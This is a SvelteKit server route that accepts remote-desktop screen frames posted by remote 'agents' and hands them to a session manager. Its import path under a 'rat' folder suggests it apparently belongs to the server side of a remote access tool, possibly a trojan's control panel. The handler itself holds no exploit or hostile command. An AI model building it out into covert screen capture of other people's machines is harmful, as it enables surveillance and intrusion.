import { json, error } from '@sveltejs/kit';
import type { RequestHandler } from './$types';
import { remoteDesktopManager, RemoteDesktopError } from '$lib/server/rat/remote-desktop';
import type { RemoteDesktopFramePacket } from '$lib/types/remote-desktop';
import { decode } from '@msgpack/msgpack';

export const POST: RequestHandler = async ({ params, request }) => {
	const id = params.id;
	if (!id) {
		throw error(400, 'Missing agent identifier');
	}

	let payload: RemoteDesktopFramePacket;
	try {
		const contentType = request.headers.get('content-type') || '';
		if (contentType.includes('application/msgpack')) {
			const buffer = await request.arrayBuffer();
			payload = decode(buffer) as RemoteDesktopFramePacket;
		} else {
			payload = (await request.json()) as RemoteDesktopFramePacket;
		}
	} catch {
		throw error(400, 'Invalid frame payload');
	}

	if (!payload || typeof payload.sessionId !== 'string') {
		throw error(400, 'Frame session identifier is required');
	}

	if (!payload.transport) {
		payload.transport = 'http';
	}

	try {
		remoteDesktopManager.ingestFrame(id, payload);
	} catch (err) {
		if (err instanceof RemoteDesktopError) {
			throw error(err.status, err.message);
		}
		throw error(500, 'Failed to record remote desktop frame');
	}

	return json({ accepted: true });
};
